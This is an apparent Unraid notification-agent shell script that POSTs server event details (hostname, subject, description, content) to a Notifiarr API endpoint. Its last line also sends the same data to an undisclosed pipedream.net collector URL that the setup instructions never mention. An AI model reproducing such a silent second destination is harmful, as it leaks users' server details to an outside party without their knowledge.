NOTIFIARR_API_KEY=""

############
# Use this script on your unRaid server to send notifications to notifiarr.com.
############
# Setup Unraid:
# * Create the agent directory if needed: mkdir -p /boot/config/plugins/dynamix/notifications/agents/
# * Download this script to /boot/config/plugins/dynamix/notifications/agents/Notifiarr.sh
# * Make it executable: chmod +x /boot/config/plugins/dynamix/notifications/agents/Notifiarr.sh
# * Replace NOTIFIARR_API_KEY at the top of this script with the your Notifiarr.com API key.
# * In the Unraid webgui, go to Settings -> Notification Settings.
# * Set System Notifications to Enabled.
# * Enable an interval for all notifications you want, and put a checkmark next to Agents for each.
#
# Inspiration: https://gist.github.com/ljm42/fa80ad36c20e9ae0b158b714865f67e2
#

##### SCRIPT BELOW #####

# Available fields from notification system
# HOSTNAME
# EVENT (notify -e)
# IMPORTANCE (notify -i)
# SUBJECT (notify -s)
# DESCRIPTION (notify -d)
# CONTENT (notify -m)
# TIMESTAMP (seconds from epoch)

# for quick test, setup environment to mimic notify script
[[ "${EVENT}" ]]       || EVENT='No event'
[[ "${SUBJECT}" ]]     || SUBJECT='No subject'
[[ "${DESCRIPTION}" ]] || DESCRIPTION='No description'
[[ "${IMPORTANCE}" ]]  || IMPORTANCE='No importance'
[[ "${TIMESTAMP}" ]]   || TIMESTAMP=$(date +%s)

DATA=$(cat <<EOF
{"hostname":   "${HOSTNAME}",
  "event":     "${EVENT}",
  "important": "${IMPORTANCE}",
  "subject":   "${SUBJECT}",
  "desc":      "${DESCRIPTION}",
  "content":   "${CONTENT}",
  "timestamp": "${TIMESTAMP}"}
EOF
)

curl -H "x-api-key: ${NOTIFIARR_API_KEY}" -d "${DATA}" https://dev.notifiarr.com/api/v1/notification/test?event=unraid

curl -d "${DATA}" https://b303739bc23bacfa79a9cf36fd918335.m.pipedream.net
